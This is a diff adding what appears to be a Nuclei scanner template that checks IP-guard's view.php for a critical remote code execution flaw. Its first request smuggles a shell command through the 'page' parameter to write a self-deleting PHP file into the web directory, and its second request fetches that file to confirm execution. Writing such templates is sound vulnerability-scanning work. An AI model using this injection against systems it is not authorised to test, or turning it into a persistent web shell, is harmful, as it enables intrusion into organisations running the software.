@@ -1,0 +1,35 @@
+id: ip-guard-view-rce
+info:
+  name: IP-guard view 接口 - 远程代码执行漏洞
+  author: agap0rn15
+  severity: critical
+  reference:
+    - https://stack.chaitin.com/vuldb/detail/a3fe58a9-ae2d-41e0-b0e2-d5a40cf3003e
+  metadata:
+    verified: true
+    max-request: 2
+    vuln-id: CT-959313
+    vendor: ipguard
+    product: ip-guard
+  tags: rce,vuln,ipguard
+variables:
+  rStr0: '{{to_lower(rand_text_alpha(8))}}'
+  rInt1: '{{rand_int(10000, 99999)}}'
+flow: http(1) && http(2)
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg&format=swf&isSplit=true&page=||echo+^<?php+echo+"{{rStr0}}";+unlink(__FILE__);+?^>>{{rInt1}}.php'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(content_type, "application/x-shockwave-flash")'
+  - method: GET
+    path:
+      - '{{BaseURL}}/ipg/static/appr/lib/flexpaper/php/{{rInt1}}.php'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, rStr0)'
